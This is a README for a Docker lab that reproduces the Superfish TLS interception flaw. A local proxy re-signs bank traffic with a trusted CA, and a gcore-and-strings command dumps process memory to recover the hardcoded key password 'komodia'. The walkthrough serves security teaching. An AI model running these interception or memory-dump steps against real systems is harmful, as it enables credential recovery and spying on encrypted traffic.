# Superfish Scenario Walkthrough (Local Proxy + Memory Dump)

This scenario recreates the Superfish vulnerability mechanism using Docker, including the local AiTM proxy and the ability to recover the private key password from memory.

## Architecture

- **Superfish CA**: A self-signed Root CA (`superfish.crt`). The private key is stored **encrypted** on disk (`superfish.enc.key`).
- **Victim**:
    - Trusts `superfish.crt`.
    - Runs a python wrapper (`superfish_service.py`) that:
        1.  Contains the hardcoded password `komodia`.
        2.  Decrypts the private key at runtime.
        3.  Starts **mitmproxy** with the decrypted key.
    - Configured to route all HTTP/HTTPS traffic through this local proxy.
- **Target Server**:
    - Serves `secure.bank.com` with a legitimate certificate.

## The Attack Flow

1.  **Interception**: The local proxy intercepts requests to `secure.bank.com` and re-signs them with the Superfish CA. The victim trusts this CA.
2.  **Memory Dump**: An attacker with access to the victim machine can dump the memory of the running service to recover the hardcoded password.

## Verification Results

### 1. Interception Verification
The victim successfully connects to `secure.bank.com` via the proxy, trusting the fake certificate.

```
* Server certificate:
*  subject: CN=secure.bank.com; O=Bank of Security
*  issuer: C=US; ST=CA; L=PaloAlto; O=Superfish Inc.; CN=Superfish, Inc. CA
*  SSL certificate verify ok.
```

### 2. Password Recovery Verification
Dumping the memory of the `superfish_service.py` process reveals the hardcoded password.

```bash
# Command run inside victim container
pgrep -f superfish_service.py | head -n 1 | xargs gcore -o /tmp/core && strings /tmp/core* | grep komodia

# Output
komodia
"komodia"
pass:komodia
```

## How to Run

1.  Generate certificates (Superfish CA Encrypted, Real CA, Real Cert):
    ```bash
    ./gen_certs.sh
    ```
2.  Start the environment:
    ```bash
    docker-compose up -d --build
    ```
3.  Verify Interception:
    ```bash
    docker exec superfish-victim curl -v https://secure.bank.com
    ```
4.  Verify Memory Dump:
    ```bash
    docker exec superfish-victim bash -c "pgrep -f superfish_service.py | head -n 1 | xargs gcore -o /tmp/core && strings /tmp/core* | grep komodia"
    ```
